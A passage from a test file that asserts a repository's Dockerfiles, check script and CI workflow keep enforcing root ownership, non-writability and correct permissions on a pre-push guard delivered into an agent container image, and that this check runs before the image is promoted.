    serverDockerfile.includes("! -perm -0005"),
    "Dockerfile's build-time check no longer asserts the launcher is readable and executable by OTHER. That RUN is root, for whom a 0700 file looks fine while uid 1000 can neither read nor run it; o+r matters as much as o+x because the kernel hands a #!/bin/sh script to an interpreter that must read it.",
  );
  assert.ok(
    serverDockerfile.includes("! -user root"),
    "Dockerfile's build-time check no longer asserts the launcher is root-owned. Agent-writable is the PEN-3715 property the bake exists to buy over the PVC copy.",
  );
  assert.ok(
    serverDockerfile.includes("-perm /022"),
    "Dockerfile's build-time check no longer rejects a group/other-writable launcher. Ownership alone is not the PEN-3715 property: a root-owned 0757 file is still rewritable by the agent.",
  );

  // (2) The AGENT image proves the DELIVERY — and deliberately NOT with a RUN
  // of its own. Dockerfile.agent is asserted to be a pure COPY overlay with no
  // RUN at all (packages/adapter-utils/src/agent-dockerfile.test.ts), and the
  // google-chrome shim test's reasoning about COPY merge semantics rests on
  // that invariant, so adding one RUN here is not a local edit. The post-build
  // lane in docker-agent.yml is the stronger evidence anyway: a build RUN is
  // root, while the agent spawns the hook as uid 1000, and that lane can run
  // the check AS uid 1000 against the real pushed image.
  assert.ok(
    !agentDockerfile.includes("RUN "),
    "Dockerfile.agent has grown a RUN. It is asserted to be a pure COPY overlay elsewhere, and the delivery check belongs in docker-agent.yml where it can run as uid 1000 on the built image.",
  );

  const checkScriptPath = "scripts/check-agent-image-publish-guard.sh";
  const checkScript = fs.readFileSync(path.join(repoRoot, checkScriptPath), "utf8");
  assert.ok(
    checkScript.includes(`hooks=${IMAGE_HOOKS_DIR}`),
    `${checkScriptPath} no longer reads ${IMAGE_HOOKS_DIR}, so the delivery check measures a different path from the one the COPY above writes.`,
  );
  assert.ok(
    checkScript.includes('test -f "$hooks/pre-push"'),
    `${checkScriptPath} no longer asserts the launcher EXISTS. Every per-file assertion in it is vacuous over an empty directory.`,
  );
  assert.ok(
    checkScript.includes("test -r") && checkScript.includes("test -x"),
    `${checkScriptPath} no longer asserts the launcher is both readable AND executable by the running uid. The launcher is a #!/bin/sh script, so the interpreter must read it; -x alone would ship an unrunnable guard.`,
  );
  assert.ok(
    checkScript.includes("! -user root") && checkScript.includes("-perm /022"),
    `${checkScriptPath} no longer asserts the delivered guard is root-owned and not group/other-writable. That is the PEN-3715 property; without it uid 1000 can rewrite the guard it is subject to.`,
  );

  const agentWorkflow = fs.readFileSync(
    path.join(repoRoot, ".github/workflows/docker-agent.yml"),
    "utf8",
  );
  assert.ok(
    agentWorkflow.includes(checkScriptPath),
    `.github/workflows/docker-agent.yml no longer runs ${checkScriptPath}. The agent image is then covered only by the text assertions above, which cannot see what the build actually produced.`,
  );
  assert.ok(
    agentWorkflow.includes("for mode in runtime ownership"),
    ".github/workflows/docker-agent.yml no longer runs BOTH arms of the delivery check. They run as different uids and neither can answer the other's question: runtime asks what uid 1000 can do, ownership asks what it must not be able to do.",
  );
  assert.ok(
    agentWorkflow.includes("PEN-4932 positive controls"),
    ".github/workflows/docker-agent.yml no longer proves the delivery check reds on a bad image. An assertion with no control that must fail it is indistinguishable from one that cannot fail at all.",
  );

  // Ordering is the whole value of the lane: the candidate tag is already
  // pushed by then, so what a red step buys is that the image is never
  // promoted to `latest-k8s-vendored` and never rolled out to an agent pod.
  // Below the promotion it would buy nothing.
  const assertIndex = agentWorkflow.indexOf("Assert the publish guard reached the agent image");
  const promoteIndex = agentWorkflow.indexOf("Promote verified agent image");
  assert.ok(assertIndex > -1 && promoteIndex > -1, "docker-agent.yml lost the delivery check or the promotion step.");
  assert.ok(
    assertIndex < promoteIndex,
    "The delivery check now runs after the image is promoted to latest-k8s-vendored. A red verdict then arrives too late to keep the image off agent pods, which is the only thing this lane can buy.",
  );
});
